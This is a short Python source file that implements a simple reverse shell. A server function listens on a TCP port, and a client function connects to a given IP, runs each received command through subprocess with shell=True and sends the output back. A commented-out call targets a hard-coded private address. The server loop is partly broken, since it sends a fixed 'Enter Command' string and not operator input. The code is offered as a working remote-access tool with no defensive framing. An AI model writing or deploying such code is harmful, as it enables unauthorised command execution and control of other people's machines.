import socket
import subprocess
import sys

def run_command(command: str):
    c = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    if c.returncode == 2:
        return b'[-] Command Error.'
    return c.stdout

def server(port: int = 4444):
    # create tcp socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',port))
    s.listen(9)
    
    myHost = socket.gethostbyname(socket.gethostname())
    print(f'[+] server is listen on port {myHost}:{port}')

    conn, addr = s.accept()
    print(f'[+] Connection from {addr[0]}:{addr[1]}')
    
    # send shell prompt
    while True:
        try:
            #conn.send(str(input('SHELL-> ')).encode())
            conn.send('Enter Command'.encode())

            result = conn.recv(2048).decode()
            # exit conditions
            if result.lower() == 'exit' or result == '':
                s.close()
                print(f'[-] Exiting...')
                sys.exit(-1)
            print(result)
    
        except KeyboardInterrupt:
            s.close()
            print(f'[-] Exit...')
            sys.exit(-1)

def client(ip: str, port: int = 4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    
    while True:
        try:
            command = s.recv(2048).decode()
            if command.lower() == 'exit':
                s.close()
                sys.exit(-1)
            
            elif command == None:
                print(f'[-] Executing command error')
                sys.exit(-1)
            
            else:
                s.send(run_command(command))

        except KeyboardInterrupt:
            print(f'[-] Exiting...')
            sys.exit(-1)

server(4455)
# client('10.204.163.247', 4444)